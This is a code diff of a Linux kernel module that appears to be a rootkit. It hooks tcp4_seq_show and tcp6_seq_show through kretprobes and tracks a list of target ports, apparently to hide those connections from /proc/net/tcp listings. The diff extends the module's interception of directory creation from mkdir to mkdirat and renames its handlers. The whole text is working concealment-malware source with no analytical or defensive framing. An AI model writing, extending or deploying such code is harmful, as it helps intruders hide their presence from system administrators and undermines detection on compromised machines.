@@ -80,34 +80,34 @@ static bool rk_target_match(struct rk_target_list *list, const char *name)
 
 /* ── tcp seq_show interception ───────────────────────────────── */
 
-struct tcp_show_data {
+struct rk_tcp_show_data {
 	struct seq_file *seq;
 	int saved_count;
 	struct sock *sk;
 };
 
 /* tcp4_seq_show is a regular function, not a syscall wrapper */
-static int tcp_show_entry(struct kretprobe_instance *ri,
+static int rk_tcp_show_entry(struct kretprobe_instance *ri,
 			   struct pt_regs *regs)
 {
-	struct tcp_show_data *data;
+	struct rk_tcp_show_data *data;
 
-	data = (struct tcp_show_data *)ri->data;
+	data = (struct rk_tcp_show_data *)ri->data;
 	data->seq = (struct seq_file *)regs->di;
 	data->saved_count = data->seq->count;
 	data->sk = (struct sock *)regs->si;
 	return 0;
 }
 
-static int tcp_show_return(struct kretprobe_instance *ri,
+static int rk_tcp_show_return(struct kretprobe_instance *ri,
 			    struct pt_regs *regs)
 {
-	struct tcp_show_data *data;
+	struct rk_tcp_show_data *data;
 	struct inet_sock *inet;
 	unsigned short sport;
 	char port_str[8];
 
-	data = (struct tcp_show_data *)ri->data;
+	data = (struct rk_tcp_show_data *)ri->data;
 
 	if (data->sk == SEQ_START_TOKEN)
 		return 0;
@@ -122,18 +122,18 @@ static int tcp_show_return(struct kretprobe_instance *ri,
 	return 0;
 }
 
-static struct kretprobe tcp4_probe = {
-	.handler        = tcp_show_return,
-	.entry_handler  = tcp_show_entry,
-	.data_size      = sizeof(struct tcp_show_data),
+static struct kretprobe rk_tcp4_probe = {
+	.handler        = rk_tcp_show_return,
+	.entry_handler  = rk_tcp_show_entry,
+	.data_size      = sizeof(struct rk_tcp_show_data),
 	.maxactive      = 20,
 	.kp.symbol_name = "tcp4_seq_show",
 };
 
-static struct kretprobe tcp6_probe = {
-	.handler        = tcp_show_return,
-	.entry_handler  = tcp_show_entry,
-	.data_size      = sizeof(struct tcp_show_data),
+static struct kretprobe rk_tcp6_probe = {
+	.handler        = rk_tcp_show_return,
+	.entry_handler  = rk_tcp_show_entry,
+	.data_size      = sizeof(struct rk_tcp_show_data),
 	.maxactive      = 20,
 	.kp.symbol_name = "tcp6_seq_show",
 };
@@ -160,12 +160,10 @@ struct rk_mkdir_data {
 	bool intercepted;
 };
 
-static int rk_mkdir_entry(struct kretprobe_instance *inst,
-			   struct pt_regs *regs)
+static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
+			     const char __user *pathname)
 {
 	struct rk_mkdir_data *data;
-	struct pt_regs *uregs;
-	const char __user *pathname;
 	char buf[RK_PATH_MAX];
 	const char *base;
 	long copied;
@@ -173,11 +171,6 @@ static int rk_mkdir_entry(struct kretprobe_instance *inst,
 	data = (struct rk_mkdir_data *)inst->data;
 	data->intercepted = false;
 
-	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
-	if (!uregs)
-		return 0;
-
-	pathname = (const char __user *)uregs->di;
 	copied = strncpy_from_user(buf, pathname, sizeof(buf));
 	if (copied <= 0)
 		return 0;
@@ -195,6 +188,28 @@ static int rk_mkdir_entry(struct kretprobe_instance *inst,
 	return 0;
 }
 
+static int rk_mkdir_entry_mkdir(struct kretprobe_instance *inst,
+				struct pt_regs *regs)
+{
+	struct pt_regs *uregs;
+
+	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+	if (!uregs)
+		return 0;
+	return rk_mkdir_do_entry(inst, (const char __user *)uregs->di);
+}
+
+static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
+				  struct pt_regs *regs)
+{
+	struct pt_regs *uregs;
+
+	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+	if (!uregs)
+		return 0;
+	return rk_mkdir_do_entry(inst, (const char __user *)uregs->si);
+}
+
 static int rk_mkdir_return(struct kretprobe_instance *inst,
 			    struct pt_regs *regs)
 {
@@ -208,7 +223,15 @@ static int rk_mkdir_return(struct kretprobe_instance *inst,
 
 static struct kretprobe rk_mkdir_probe = {
 	.kp.symbol_name = "__x64_sys_mkdir",
-	.entry_handler  = rk_mkdir_entry,
+	.entry_handler  = rk_mkdir_entry_mkdir,
+	.handler        = rk_mkdir_return,
+	.data_size      = sizeof(struct rk_mkdir_data),
+	.maxactive      = 8,
+};
+
+static struct kretprobe rk_mkdirat_probe = {
+	.kp.symbol_name = "__x64_sys_mkdirat",
+	.entry_handler  = rk_mkdir_entry_mkdirat,
 	.handler        = rk_mkdir_return,
 	.data_size      = sizeof(struct rk_mkdir_data),
 	.maxactive      = 8,
@@ -222,11 +245,11 @@ static int __init rk_init(void)
 
 	spin_lock_init(&port_targets.lock);
 
-	ret = register_kretprobe(&tcp4_probe);
+	ret = register_kretprobe(&rk_tcp4_probe);
 	if (ret)
 		return ret;
 
-	ret = register_kretprobe(&tcp6_probe);
+	ret = register_kretprobe(&rk_tcp6_probe);
 	if (ret)
 		goto fail_tcp6;
 
@@ -234,20 +257,27 @@ static int __init rk_init(void)
 	if (ret)
 		goto fail_mkdir;
 
+	ret = register_kretprobe(&rk_mkdirat_probe);
+	if (ret)
+		goto fail_mkdirat;
+
 	return 0;
 
+fail_mkdirat:
+	unregister_kretprobe(&rk_mkdir_probe);
 fail_mkdir:
-	unregister_kretprobe(&tcp6_probe);
+	unregister_kretprobe(&rk_tcp6_probe);
 fail_tcp6:
-	unregister_kretprobe(&tcp4_probe);
+	unregister_kretprobe(&rk_tcp4_probe);
 	return ret;
 }
 
 static void __exit rk_exit(void)
 {
+	unregister_kretprobe(&rk_mkdirat_probe);
 	unregister_kretprobe(&rk_mkdir_probe);
-	unregister_kretprobe(&tcp6_probe);
-	unregister_kretprobe(&tcp4_probe);
+	unregister_kretprobe(&rk_tcp6_probe);
+	unregister_kretprobe(&rk_tcp4_probe);
 }
 
 module_init(rk_init);
